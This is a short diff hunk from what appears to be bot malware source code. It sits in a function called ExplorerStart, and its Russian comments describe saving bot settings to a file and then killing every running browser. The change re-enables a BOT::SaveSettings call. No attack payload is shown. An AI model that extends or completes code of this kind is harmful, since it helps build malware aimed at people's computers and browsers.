@@ -75,7 +75,7 @@ void ExplorerStart(PEventData Data)
 
 	// Записываем текущие настроки в файл.
 	// Запись осуществится только если записанных настроек нет
-    //BOT::SaveSettings(true, true, true);
+    BOT::SaveSettings(true, true, true);
 
 
 	// Убиваем все запущенные браузеры
